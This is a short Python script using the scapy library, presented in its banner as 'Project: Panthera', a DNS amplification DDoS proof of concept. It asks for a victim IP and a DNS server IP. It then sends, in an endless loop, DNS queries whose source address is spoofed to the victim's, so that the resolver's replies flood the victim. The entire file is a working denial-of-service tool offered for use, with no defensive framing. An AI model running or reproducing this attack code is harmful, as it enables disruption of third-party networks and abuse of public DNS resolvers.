#!/usr/bin/python
import sys
import os
from scapy.all import *

cmd = "clear"
returned_value = os.system(cmd)
sys.stdout.write("\033[1;31m")
print "\n						Project: Panthera\n"
print "\n						Coder: Haroon Awan\n"
sys.stdout.write("\033[1;33m")
print "[ + ] Version: 		Open Source Edition 1.0a\n"
print "[ + ] Contact: 		mrharoonawan\@gmail\.com\n"
print "[ + ] Environment: 	Python under Kali Linux\n"
print "[ + ] Github: 		Https://www.github.com/haroonawanethicalhacker\n"
print "[ + ] Design Scheme: 	DDos using spoofed DNS to victim IP causing amplification \n"
print "[ + ] Usage: 		python DDOS_DNS_POC.py\n\n"

sys.stdout.write("\033[0;32m")
victimIP = raw_input("[ + ] Enter victim IP ... : ")
dnsIP = raw_input("[ + ] Enter source DNS  ... :  ")
print "[ + ] Sending spoofed source DNS requests via victim IP  ... :  "
print "[ + ] Contacting Target  ... :  "
while True:
        send(IP(dst=dnsIP,src=victimIP)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.com")),verbose=0)
print('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')